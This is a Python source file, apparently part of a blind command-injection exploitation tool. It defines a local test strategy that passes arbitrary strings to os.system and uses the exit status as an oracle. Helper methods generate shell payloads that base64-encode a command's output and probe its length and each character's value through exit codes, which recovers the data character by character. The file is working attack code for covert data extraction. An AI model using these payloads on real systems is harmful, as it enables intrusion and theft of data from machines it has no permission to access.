import os
from strategies.abstract_strategy import AbstractStrategy

class LocalTestStrategy(AbstractStrategy):
    def send_payload(self, payload, timeout=10):
        try:
            print(f"Executing: {payload}")
            result = os.system(payload)
            return result == 0
        except Exception as e:
            print(f"Error: {str(e)}")
            return None
    
    def create_length_check_payload(self, cmd, length):
        return f"t=$({cmd}|base64|tr -d '\n'); [ ${{#t}} -ge {length} ] || exit 1"
    
    def create_char_check_payload(self, cmd, position, char_value):
        return f'echo "$({cmd}|base64|tr -d \'\n\')"|cut -c{position+1}|od -An -tuC -N1|tr -d " "|xargs -I{{}} expr {{}} "=" {char_value} > /dev/null || exit 1'
    
    def create_char_less_than_payload(self, cmd, position, char_value):
        return f'echo "$({cmd}|base64|tr -d \'\n\')"|cut -c{position+1}|od -An -tuC -N1|tr -d " "|xargs -I{{}} expr {{}} "<" {char_value} > /dev/null || exit 1'